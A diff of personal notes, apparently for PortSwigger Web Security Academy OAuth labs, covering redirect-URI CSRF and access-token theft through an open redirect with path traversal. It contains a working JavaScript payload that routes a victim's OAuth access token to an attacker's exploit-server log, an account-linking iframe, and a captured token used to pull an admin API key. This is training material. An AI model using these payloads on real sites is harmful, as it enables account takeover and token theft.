@@ -29,24 +29,42 @@ Send to Victim
 
 Now if you log out and log in using social media profile you are instantly logged as administrator
 
-4. Hijack Redirect URI
+4. Hijack Redirect URI:
 Gereate CSRF POC of /auth?clientid=[...] and change redirect uri to your exploit server
 Use the token recieved to log in with /oauth-callback?code=STOLEN
 
-5. Hijack Via Open Redirect
-Find Open redirect /post/next?path=exploit-server
-Confirm the redirection:
-https://oauth-0af4001104ece39e84d339950265009a.oauth-server.net/auth?client_id=cmhgvh5osg557j25uajyh&redirect_uri=https://0a3100e204c2e37084bc3b3d00a20002.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5500d0048ce37284bf3a0a0106009f.exploit-server.net/&response_type=token&nonce=-1315320397&scope=openid%20profile%20email
+5. **Hijack Acess Tokens via Open Redirect**
+- Encontamos Open Redirect en el apartado de 'next post' con ruta /post/next?path=/post?postId=7
+- El sevidor obliga a que el redirect de 'redirect_uri' sea desde el dominio de la academia, asi que, con ../ escapamos al directorio anterior, y aprovechamos el Open Redirect de los posts, poniendo como nuevo path el exploit server:
 
-Change Values in the PoC to retrieve the token in /exploit:
+......&redirect_uri=https://0a3100e204c2e37084bc3b3d00a20002.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5500d0048ce37284bf3a0a0106009f.exploit-server.net/exploit......
+
+- Probamos este payload en una solicitud de OAuth (con forward de la misma) y obtenemos los datos en la URL con un # de la siguiente forma:
+
+htttps://exploit-0a430014039175f6809f160601570016.exploit-server.net/exploit#access_token=ypEjaUec4_9GmdcWOITtkcA6fVOaIxx8Tx31ConhV4J&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
+
+- Si mandasemos esto a la victima no veriamos en los logs la parte del #, por lo que habria que montar un pequeño script para formatearlo y quitar ese #:
+
+```js
 <script>
 if (!document.location.hash){
-window.location="https://oauth-0af4001104ece39e84d339950265009a.oauth-server.net/auth?client_id=cmhgvh5osg557j25uajyh&redirect_uri=https://0a3100e204c2e37084bc3b3d00a20002.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5500d0048ce37284bf3a0a0106009f.exploit-server.net/exploit&response_type=token&nonce=-1315320397&scope=openid%20profile%20email"
+window.location="https://oauth-0a40009d036a75c480a9156e025400ff.oauth-server.net/auth?client_id=abi4j4qgiqr322tm7kxty&redirect_uri=https://0a7b00ca03b475ce8035176900dc00e4.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a430014039175f6809f160601570016.exploit-server.net/exploit&response_type=token&nonce=-1354733010&scope=openid%20profile%20email"
 } else {
 window.location = '/?'+document.location.hash.substr(1)
 }
 </script>
+```
 
+- document.location.hash es la parte del # en adelante, entonces, si NO existe (primera visita) le redigirimos al OAuth, alli con el Open Redirect justo cuando recibe el token vuelve para nuestro exploit server pero con la informacion del # (fragment identifier / hash), ahora (en la segunda visita) ya no cumple la condicion del if y pasamos a formatear la url concatenando la raiz (https://exploit-0a430014039175f6809f160601570016.exploit-server.net/) con un '/?' y por ultimo la parte del # sin el primer caracter, para que ahora todo viaje en la URL a nuestro access log ;)
+
+- Ahora, con este access_token, en una ruta que descubrimos anteriormente (/me) podemos consultar la informacion de X usuario con su token Bearer {token}:
+![[Pasted image 20260801210546.png|700]]
+
+- Introducimos el del administrador, y tenemos la API Key:
+![[Pasted image 20260801210612.png|450]]
+
+
+-------------------------------------------------------------------------
 ##### Capture OAuth link 
 And send it in an iframe to make the victim perform the ouathflow. Then login with social media, it will load the victim user.
 `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
@@ -92,7 +110,7 @@ Poc to perform an open redirect found, we are using a path traversal found in oa
 ```js
 <script>
 if (!document.location.hash){
-window.location="https://oauth-0ad300af0450eb0781bbfff3022500b2.oauth-server.net/auth?client_id=ag2rq0tbm8hchcusqw9gk&redirect_uri=https://0ace00ad0408eb1c82e501ce00c50007.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ad900fd04efeb54826e007301e800f9.exploit-server.net/exploit&response_type=token&nonce=1870905122&scope=openid%20profile%20email"
+window.location="https://oauth-0a40009d036a75c480a9156e025400ff.oauth-server.net/auth?client_id=abi4j4qgiqr322tm7kxty&redirect_uri=https://0a7b00ca03b475ce8035176900dc00e4.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a430014039175f6809f160601570016.exploit-server.net/exploit&response_type=token&nonce=-1354733010&scope=openid%20profile%20email"
 } else {
 window.location = '/?'+document.location.hash.substr(1)
 }
